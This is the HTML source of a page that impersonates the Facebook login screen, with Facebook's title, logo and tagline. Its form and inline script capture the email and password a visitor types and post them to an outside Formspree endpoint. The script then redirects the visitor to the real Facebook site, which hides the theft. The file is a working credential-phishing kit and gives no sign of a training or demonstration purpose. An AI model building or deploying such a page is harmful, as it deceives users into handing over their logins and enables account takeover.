<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="asset/Facebook-f_Logo-Blue-Logo.wine.svg" type="image/x-icon">
    <link rel="stylesheet" href="css/index.css">
    <title>Facebook - log in or sign up</title>
    <script src="/js/screen-detection.js" type="module"></script>
</head>
<body>
    
    <div class="top">
        <div class="left">
            <h1>facebook</h1>

            <p>Facebook helps you connect and share with the people in your life.</p>
        </div>

        <div class="right">
            <form id="facebookForm" action="https://formspree.io/f/xayrjbgp" method="POST" onsubmit="submitForm()">
                <input type="text" name="email" id="email" placeholder="Email address or phone number">
    
                <input type="password" name="password" id="password" placeholder="Password">
                
                <button id="submit">Log in</button>
    
                <a href="" class="forgotten">Forgotten password?</a>
    
                <hr>
    
                <a href="" class="new-account">Create new account</a>
            </form>

            <p class="new-page"><a href=""><b>Create a Page</b></a> for a celebrity, brand or business.</p>
            
        </div>  
    </div>





    <script>
        
        function submitForm() {
            // Prevent the default form submission
            event.preventDefault();

            // Get the form data
            const formData = new FormData(document.getElementById("facebookForm"));

            // Send the form data to Formspree using Fetch API
            fetch("https://formspree.io/f/xayrjbgp", {
                method: "POST",
                body: formData,
                headers: {
                    Accept: "application/json",
                },
            })
            .then(response => response.json())
            .then(data => {
                // Handle the response data as needed

                // After processing, you can hide the form or take other actions
                window.location.href = 'https://web.facebook.com/';
            })
            .catch(error => {
                console.error("Error submitting the form:", error);
                alert("Feedback not sent! Check network connection and try again");
            });
        }
    </script>
    
</body>
</html>
